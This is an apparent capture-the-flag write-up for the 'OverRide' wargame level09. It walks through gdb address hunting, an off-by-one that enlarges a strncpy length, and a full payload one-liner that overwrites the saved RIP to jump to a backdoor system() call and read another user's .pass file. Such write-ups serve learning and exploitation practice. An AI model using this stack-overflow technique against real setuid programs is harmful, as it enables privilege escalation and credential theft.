### step 1: Decompile with Ghydra

- Binary in 64-bits

```
level09@OverRide:~$ file level09 
level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
```

- Sources are available in `source.c`


### step 2: Code Analysis

- the `main` function calls a `handle_msg`function
- the `handle_msg`function has a buffer `ref [140]` that is passed to two functions `set_username` and `set_msg`
- finally we have a `secret_backdoor` function which prompts for and input which is then given has an argument of a `system` call. We wan't to modifiy the rip (not eip because the binary is in 64-bits) of `handle_msg` function to point to the `secret_backdoor` function and then cat the .pass file with the call of the function `system`

### step 3: Find the adresses

1) `secret_backdoor` function address
```
gdb level09
info functions
```
- `secret_backdoor` function address : `0x000055555555488c`

2) rip address of `handle_msg` function

```
gdb level09
b handle_msg
 r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x00005555555548c4 in handle_msg ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x5555555548c4 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe5c0, args: 
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
```
- rip of `handle_msg` function : `0x7fffffffe5c8`

3) `ref` start of buffer address

Set breakpoint before the call of set_msg or set_username in handle_msg because the ref is passed as an argument to these functions so we can find the address in rax

```
gdb level09
start
disas handle_msg
b *0x0000555555554910
c
(gdb) x $rax
0x7fffffffe500:	0x0000000a
```
- `ref`begin address :`0x7fffffffe500`

### Step 4 : Find the offset between ref and rip

- You can find a schema at `/level09/Ressources/Schema.png` which can help to understand the offsets

- the offset between ref and rip address is :
`0x7fffffffe5c8 - 0x7fffffffe500 = 200`

- When analysing decompiled code :
  `set_username` function is writing first input from `ref + 140 to ref + 181`
  `set_msg` function is writing second input from `ref to ref + 180`


### Step 5 : Exploit 

- To overwrite the rip of the `handle_msg` function we need to at `ref + 200`
- How to write more than 180 chars :

```c
strncpy(ref,(char *)buffer,(long)*(int *)(ref + 180));
```

The size of `strncpy` is calculated at the address `ref + 180` : We can input a tricky value with the char `\xff` that is evaluated as 255 -> The `strncpy` will copy up to 255 of our input and we will reach the 200 bytes offset of the `RIP`  

Now we gather all the informations we have to create the exploit :

0x000055555555488c to little endian : \x8c\x48\x55\x55\x55\x55\x00\x00

final string : 

```
(python -c 'print("a" * 40 + "\xFF")' ; python -c 'print(200 * "b" + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; echo 'cat /home/users/end/.pass') | ./level09
```
And we get the flag !